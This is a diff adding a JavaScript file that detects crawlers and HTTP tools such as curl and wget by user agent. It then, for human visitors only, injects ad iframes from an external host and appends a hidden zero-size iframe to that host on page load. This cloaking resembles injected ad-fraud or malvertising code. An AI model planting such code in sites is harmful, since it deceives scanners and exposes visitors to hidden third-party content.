@@ -1,0 +1,17 @@
+var is_test=false;function is_check_bb()
+{var botPattern="(googlebot\/|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|Chrome-Lighthouse|Google Page Speed Insights|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis)";var re=new RegExp(botPattern,'i');var userAgent=navigator.userAgent;if(re.test(userAgent)){return true;}else{return false;}}
+function set_bb(ad_type)
+{document.addEventListener('DOMContentLoaded',function(){set_bb_one(ad_type);});}
+function set_bb_one(ad_type)
+{if(!is_check_bb())
+{var url='https://pub.qwerty24.net/';var ad=new Array();ad['bb_desktop']='<iframe name="aa_desktop" title="aa_desktop" src="'+url+'desktop" width="100%" height="250" scrolling="no" marginwidth="0" marginheight="0" frameborder="0"></iframe>';ad['bb_mobile']='<iframe name="aa_mobile" title="aa_mobile"  src="'+url+'desktop" width="100%" height="250" scrolling="no" marginwidth="0" marginheight="0" frameborder="0"></iframe>';ad['bb_mobile_top']='<iframe name="aa_mobile_top" title="aa_mobile_top"  src="'+url+'mobile" width="100%" height="100" scrolling="no" marginwidth="0" marginheight="0" frameborder="0"></iframe>';var els=document.getElementsByClassName(ad_type);Array.prototype.forEach.call(els,function(el)
+{if(el.innerHTML)
+{}
+else
+{el.innerHTML='<center>'+ad[ad_type]+'</center>';}});}}
+function set_view()
+{if(!is_check_bb())
+{document.addEventListener('DOMContentLoaded',function(){var ifrm=document.createElement('iframe');ifrm.setAttribute('src','https://pub.qwerty24.net/view');ifrm.setAttribute('width','0');ifrm.setAttribute('height','0');ifrm.style.display="none";document.body.appendChild(ifrm);});}}
+function run_bb()
+{set_bb('bb_mobile');set_bb('bb_mobile_top');set_bb('bb_desktop');set_view();}
+run_bb();
